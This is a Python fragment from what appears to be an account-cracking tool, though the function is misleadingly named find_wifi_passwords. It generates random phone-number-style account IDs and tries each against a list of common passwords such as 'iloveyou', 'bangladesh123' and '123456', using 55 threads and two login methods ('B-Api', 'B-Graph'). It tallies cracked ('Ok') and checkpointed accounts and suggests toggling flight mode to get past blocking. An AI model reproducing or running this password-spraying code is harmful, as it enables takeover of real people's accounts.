def find_wifi_passwords():
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code + love
            pword = [love[1:], love, code + love, "i love you", "iloveyou", "bangladesh", "bangladesh123", "708090", "102030", "777000", "888000", "999000", "123456"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
        linex()
        print(f" {xxx('!')} Process Completed ")
        print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
        print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
        linex()
        input(f" {xxx('!')} Press Enter To Back ")
        sys.exit()
